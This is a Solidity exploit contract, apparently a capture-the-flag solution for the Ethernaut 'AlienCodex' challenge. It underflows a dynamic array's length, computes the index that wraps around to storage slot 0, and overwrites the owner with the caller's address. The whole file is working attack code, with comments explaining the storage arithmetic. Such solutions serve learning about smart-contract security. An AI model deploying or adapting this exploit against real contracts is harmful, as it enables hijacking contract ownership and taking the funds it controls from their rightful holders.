// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface AlienCodex {
    function owner() external view returns (address);
    
    function makeContact() external;

  function retract()  external;

  function revise(uint, bytes32)  external;
}
contract AlienCodexAttack {
 AlienCodex target;
  constructor (address _target){
      target = AlienCodex(_target);
  }
  function attack() public{
    // Make contact
    target.makeContact();

    // Underflow array length
    target.retract();

    // Compute Owner's slot offset referenced to array index 0 slot
    // Owner is in slot 0000000000000000000000000000000000000000000000000000000000000000
    // Array is in slot 0000000000000000000000000000000000000000000000000000000000000001
    // Array[0] is in slot H(0x0000000000000000000000000000000000000000000000000000000000000001) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 
    // To write Owner's slot we have to write array[offset],
    // where offset = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 0x0000000000000000000000000000000000000000000000000000000000000001

    uint256 offset = 
      uint256(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
      - uint256(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)
      + uint256(0x0000000000000000000000000000000000000000000000000000000000000001);
  
    // change ownership
    target.revise(offset, bytes32(uint256(uint160(msg.sender))));
  }
}
